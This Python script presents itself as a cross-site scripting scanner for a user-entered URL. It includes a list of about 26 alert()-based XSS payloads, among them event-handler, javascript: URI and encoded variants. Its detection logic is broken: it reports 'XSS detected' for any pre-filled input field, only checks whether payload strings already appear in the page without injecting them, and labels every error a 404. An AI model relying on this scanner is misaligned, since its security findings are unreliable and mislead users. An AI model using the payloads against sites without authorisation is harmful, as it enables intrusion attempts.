import requests
from bs4 import BeautifulSoup
from colorama import init, Fore, Style


init(autoreset=True)

def check_xss(url):
    try:
        response = requests.get(url)
        soup = BeautifulSoup(response.text, 'html.parser')

        
        input_fields = soup.find_all('input')
        for field in input_fields:
            if 'value' in field.attrs and field['value'].strip() != '':
                print(f"\n{Fore.GREEN}[!] XSS detected in{url}")
                print(f"{Fore.YELLOW}    Input field value: {field['value']}")
                print(f"{Fore.CYAN}    Full input tag: {field}")
                print(f"{Fore.YELLOW}    Attributes:")
                for attr in ['name', 'type', 'placeholder']:
                    if attr in field.attrs:
                        print(f"{Fore.YELLOW}      - {attr}: {field[attr]}")
                return

        
        scripts = soup.find_all('script')
        for script in scripts:
            if script.string is not None:
                script_content = script.string.strip()
                if '<script>' in script_content or '</script>' in script_content:
                    print(f"\n{Fore.GREEN}[!]  detected XSS in {url}")
                    print(f"{Fore.YELLOW}    Script content  {script_content}")
                    return

        
        payloads = [
            '<script>alert("XSS")</script>',
            '<img src=x onerror=alert("XSS")>',
            'javascript:alert("XSS")',
            '"><script>alert("XSS")</script>',
            '"><img src=x onerror=alert("XSS")>',
            '" onmouseover=alert("XSS")',
            '" onfocus=alert("XSS")',
            '" onkeypress=alert("XSS")',
            '" onload=alert("XSS")',
            '" onerror=alert("XSS")',
            '" onsubmit=alert("XSS")',
            '" onreset=alert("XSS")',
            '<svg onload=alert("XSS")>',
            '<iframe src="javascript:alert(`XSS`)">',
            '<body onload=alert("XSS")>',
            '<video><source onerror="alert(\'XSS\')">',
            '<details open ontoggle=alert("XSS")>',
            '<a href="javas&#99;ript:alert(1)">click</a>',
            '<input autofocus onfocus=alert("XSS")>',
            '<div style="animation-name:rotation" onanimationstart="alert(\'XSS\')"></div>',
            '<object data="javascript:alert(\'XSS\')">',
            '<embed src="javascript:alert(\'XSS\')">',
            '<form><button formaction="javascript:alert(\'XSS\')">X</button></form>',
            '<math><mtext><img src=x onerror=alert("XSS")></mtext></math>',
            '<isindex prompt="XSS" action="javascript:alert(\'XSS\')">',
            '<meta http-equiv="refresh" content="0;url=javascript:alert(\'XSS\')">',
        ]

        for payload in payloads:
            if payload in response.text:
                print(f"\n{Fore.GREEN}[!] XSS detected in> {url}")
                print(f"{Fore.YELLOW}    Triggered by payload> {payload}")
                return

        print(f"\n{Fore.RED}[-] No xss vuln found{url}")
    except Exception as e:
        print(f"{Fore.RED}[!] 404 error {url}: {e}")


url = input(f"{Fore.BLUE} Enter website url ")
check_xss(url)